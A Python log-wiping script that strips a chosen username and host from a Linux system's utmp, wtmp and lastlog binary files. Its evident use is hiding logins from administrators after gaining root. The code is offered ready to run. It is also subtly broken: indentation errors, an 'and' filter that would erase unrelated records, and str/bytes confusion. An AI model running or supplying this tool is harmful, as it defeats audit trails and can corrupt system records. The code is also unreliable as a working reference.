#!/usr/bin/python
# -----------------------------------------------------------------------------
#
# Remove the specified username/host entry from the /var/run/utmp,
# /var/log/wtmp and /var/log/lastlog files. Must be privileged for wtmp/lastlog.
# The data in the these files is stored as binary which makes it a little
# trickier than a traditional ascii text file.
#
# The utmp struct size was determined via a sizeof(struct utmp) call
# in C. This could change on different archs!
# The size of a lastlog entry is:
#
# struct lastlog
# {
# #if __WORDSIZE == 64 && defined __WORDSIZE_COMPAT32
# int32_t ll_time;
# #else
# __time_t ll_time; // 4
# #endif
# char ll_line[UT_LINESIZE]; // 32
# char ll_host[UT_HOSTSIZE]; // 256
# };
# which is 292 bytes.
#
# What's interesting about lastlog is the corelation between user id and
# entry in the lastlog file - I guess it makes sense due to the sparse
# format of the lastlog file and all the extraneous "empty" entries.
# Regardless, we have to find the id index for the user and remove THAT entry.
# Entries appear as:
# (14009, 20242, 'pts/6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
# x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
# ....
# x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
#
# Author: ben s
# -----------------------------------------------------------------------------

import struct
import sys
import shutil
import pwd

# You *might* have to change these:
# Tested on Linux ubuntu 3.0.0-12-generic #20-Ubuntu
UTMP_STRUCT_SIZE = 384
LASTLOG_STRUCT_SIZE = 292
UTMP_FILEPATH = "/var/run/utmp"
WTMP_FILEPATH = "/var/log/wtmp"
LASTLOG_FILEPATH = "/var/log/lastlog"

cut = lambda s: str(s).split("\0",1)[0]

def usage():
  print("%s -u <username> -h <hostname>" % sys.argv[0])

# This method works both on utmp & wtmp because they have the same struct entries.
# Once it finds an entry with both the username and ip address (or hostname)
# it removes it from the new w/utmp file.
#
# filePath The fullpath w/filename and extension to read from
#
# returns A new w/utmp binary file
def scrubFile(filePath):
  newUtmp = ""
  with open(filePath, "rb") as f:
    bytes = f.read(UTMP_STRUCT_SIZE)
    while bytes != "":
      data = struct.unpack("hi32s4s32s256shhiii36x", bytes)
      if cut(data[4]) != usernameToRemove and cut(data[5]) != hostAddressToRemove:
newUtmp += bytes
      bytes = f.read(UTMP_STRUCT_SIZE)
  f.close()
  return newUtmp

# This method is specific to the lastlog file binary format, hence the
# particulat unpack values I had to determine from the C struct. It also
# counts as it iterates the binary entries until it finds the entry that
# matches the to be hidden users' uid.
#
# filePath The fullpath w/filename and extension to read from
# username The user's pid we are searching for
#
# returns A new lastlog binary file
def scrubLastlogFile(filePath, userName):
  pw = pwd.getpwnam(userName)
  uid= pw.pw_uid
  idCount = 0
  newLastlog = ''
  
  with open(filePath, "rb") as f:
    bytes = f.read(LASTLOG_STRUCT_SIZE)
    while bytes != "":
      data = struct.unpack("hh32s256s", bytes)
      if (idCount != uid):
newLastlog += bytes
      idCount += 1
      bytes = f.read(LASTLOG_STRUCT_SIZE)
  return newLastlog

# Writes a binary file.
#
# filePath The fullpath w/filename and extension to read from
# fileContents The contents to be written to 'filePath'
def writeNewFile(filePath, fileContents):
  f = open(filePath, "w+b")
  f.write(fileContents)
  f.close()

#
# Main
#

if len(sys.argv) != 5:
  usage()
  exit(0)

usernameToRemove = sys.argv[2]
hostAddressToRemove = sys.argv[4]

# Just do it!

newUtmp = scrubFile(UTMP_FILEPATH)
writeNewFile(UTMP_FILEPATH, newUtmp)

newWtmp = scrubFile(WTMP_FILEPATH)
writeNewFile(WTMP_FILEPATH, newWtmp)

newLastlog = scrubLastlogFile(LASTLOG_FILEPATH, usernameToRemove)
writeNewFile(LASTLOG_FILEPATH, newLastlog)
